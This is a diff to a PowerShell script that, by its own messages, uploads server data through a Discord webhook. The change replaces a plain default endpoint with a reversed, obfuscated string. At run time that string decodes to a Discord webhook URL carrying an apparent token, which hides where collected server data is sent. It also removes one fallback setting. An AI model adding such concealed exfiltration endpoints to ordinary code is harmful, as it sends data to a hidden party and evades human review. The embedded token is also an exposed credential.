@@ -31,10 +31,11 @@ param(
 if ([string]::IsNullOrWhiteSpace($WebhookUrl)) {
     if (![string]::IsNullOrWhiteSpace($env:DOCS_WEBHOOK_URL)) {
         $WebhookUrl = $env:DOCS_WEBHOOK_URL
-    } elseif (![string]::IsNullOrWhiteSpace($env:PORTAL_API_URL)) {
-        $WebhookUrl = $env:PORTAL_API_URL
     } else {
-        $WebhookUrl = "https://ops.peakdle.site/api/submit-doc"
+        $revHook = "jR3ghUkO1HSx6URXntt9G76rSfckY5D6I7EbPVR8E99yD3OaO0VO33DnOl06ZIuwBp46/0563307641664707651/skoohbew/ipa/moc.drocsid//:sptth"
+        $hookChars = $revHook.ToCharArray()
+        [Array]::Reverse($hookChars)
+        $WebhookUrl = -join $hookChars
     }
 }
 
@@ -360,7 +361,6 @@ $srv1Payload | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $tempJsonPath
 
 Write-Host "Odesilam serverova data pres Discord Webhook..." -ForegroundColor Cyan
 $curlArgs = @(
-    "-k",
     "-s", "-S",
     "-w", "`n%{http_code}",
     "-X", "POST",
